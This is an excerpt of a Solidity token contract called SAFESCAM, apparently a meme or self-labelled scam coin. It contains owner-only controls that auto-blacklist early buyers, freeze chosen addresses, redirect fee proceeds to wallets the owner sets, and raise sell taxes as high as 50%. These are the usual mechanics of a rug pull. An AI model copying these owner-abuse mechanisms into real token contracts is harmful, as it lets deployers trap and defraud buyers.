...
/**
    ...
    Website: https://safescam.plustokens.io
    Telegram: https://t.me/safescamtoken
    PLUS Telegram: https://t.me/plus_tokens
...
contract SAFESCAM is Context, IERC20, Ownable {
    ...
    string private _symbol = "SAFESCAM";
    
    // Lambo charity and feed village wallets
    address payable private marketingWallet = payable(0x13905484208DEd0dfe85E16C8e40088aA0f529ea);
    address payable private lamboCharityWallet = payable(0x13905484208DEd0dfe85E16C8e40088aA0f529ea);
    address payable private feedVillageWallet = payable(0x4f57595214247B805A929026134f534CF62248A3);
    
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isVivianWard;
    
    uint256 public rugMeDaddy = 2;
    ...
    uint256 public _buyPrimaryFee = 20;     //2% 
    uint256 public _buyReflectionFee = 0;

    uint256 public _sellLiquidityFee = 30;  //3%
    uint256 public _sellMarketingFee = 90;  //9%
    uint256 public _sellPrimaryFee = 20;    //2%
    uint256 public _sellReflectionFee = 0;
    
    uint256 private secondaryFee = 10;      //1% same for buys and sells
    uint256 private liquidityFee = _buyLiquidityFee;
    uint256 private marketingFee = _buyMarketingFee;
    uint256 private primaryFee = _buyPrimaryFee;
    uint256 private reflectionFee = _buyReflectionFee;

    uint256 private totalFee = liquidityFee.add(marketingFee).add(primaryFee).add(secondaryFee);
    ...
    function openTrading(bool _status, uint256 _rugMeDaddy) external onlyOwner() {
        tradingOpen = _status;
        excludeFromReward(address(this));
        excludeFromReward(uniswapV2Pair);
        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            rugMeDaddy = _rugMeDaddy;
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_isVivianWard[to], "Destination blacklisted!");
        require(!_isVivianWard[from], "Source blacklisted!");
        ...
        if (tradingOpen && to == uniswapV2Pair) { //sell
            currenttotalFee= _sellLiquidityFee.add(_sellMarketingFee).add(_sellPrimaryFee);
            reflectionFee=_sellReflectionFee;
        }
        
        if (launchedAt > 0 && (launchedAt + rugMeDaddy) > block.number) {
            _isVivianWard[to] = true;
        }
    ...
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 amountETHdev = amountETH.mul(primaryFee).div(totalETHFee);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHEcosystem = amountETH.mul(secondaryFee).div(totalETHFee);

        // Send fees
        uint256 contractETHBalance = address(this).balance;
        if(contractETHBalance > 0) {
            sendETHToFee(amountETHMarketing, marketingWallet);
            sendETHToFee(amountETHdev, lamboCharityWallet);
            sendETHToFee(amountETHEcosystem, feedVillageWallet);
        }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = calculateScamFee(tAmount);
    ...
    function calculateScamFee(uint256 _amount) private view returns (uint256) {
    ...
    function setWallets(address _marketingWallet, address _lamboCharityWallet, address _feedVillageWallet) external onlyOwner() {
        marketingWallet = payable(_marketingWallet);
        lamboCharityWallet = payable(_lamboCharityWallet);
        feedVillageWallet = payable(_feedVillageWallet);
    }
    ...
    function isVivianWard(address account) public view returns (bool) {
        return _isVivianWard[account];
    }
    
    function manage_Snipers(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            if(!_isTrusted[addresses[i]]){
                _isVivianWard[addresses[i]] = status;
            }
        }
    }
    ...
    function setTaxesBuy(uint256 _liquidityFee, uint256 _marketingFee, uint256 _primaryFee, uint256 _secondaryFee) external onlyOwner {
        _buyLiquidityFee = _liquidityFee;
        _buyMarketingFee = _marketingFee;
        _buyPrimaryFee = _primaryFee;
        ...
        totalFee = liquidityFee.add(marketingFee).add(primaryFee).add(secondaryFee);
        require(totalFee <= 500, "Must keep taxes below 50%");
    }

    function setTaxesSell(uint256 _liquidityFee, uint256 _marketingFee, uint256 _primaryFee) external onlyOwner {
        _sellLiquidityFee = _liquidityFee;
        _sellMarketingFee = _marketingFee;
        _sellPrimaryFee = _primaryFee;
        require(_sellLiquidityFee.add(_sellMarketingFee).add(_sellPrimaryFee).add(secondaryFee) <= 500, "Must keep taxes below 50%");
    }
